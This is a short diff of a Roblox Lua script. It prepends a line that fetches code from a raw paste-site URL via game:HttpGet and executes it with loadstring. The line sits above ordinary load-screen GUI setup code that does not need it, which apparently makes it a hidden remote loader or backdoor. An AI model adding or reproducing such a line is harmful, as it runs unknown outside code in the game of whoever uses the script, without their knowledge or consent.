@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://pastejustit.com/raw/i87yugr321hj"))()
+
+
 local guiyyy = Instance.new("ScreenGui")
 local TweenService = game:GetService("TweenService")
   guiyyy.Name = "LoadScreen"
